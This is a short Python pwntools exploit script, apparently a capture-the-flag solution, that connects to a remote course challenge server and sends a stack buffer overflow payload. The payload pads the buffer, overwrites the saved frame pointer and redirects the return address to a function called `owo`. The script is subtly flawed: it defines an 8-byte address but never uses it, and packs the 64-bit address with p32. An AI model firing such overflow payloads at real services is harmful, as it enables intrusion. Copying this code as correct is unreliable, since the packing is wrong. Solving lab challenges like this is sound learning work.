from pwn import *

p = remote("cs2107-challs.nusgreyhats.org", 8054)

# Step-by-step construction of the payload
padding = b"A" * 64             # Fill buffer (64 bytes)
frame_pointer = b"B" * 8        # Overwrite saved frame pointer (8 bytes)
owo_address = b"\x66\x11\x40\x00\x00\x00\x00\x00"  # Address of `owo` in little-endian

# Complete payload
payload = padding + frame_pointer + p32(0x0000000000401166)

p.sendline(payload)
response = p.recvall()
print(response)
p.close()
 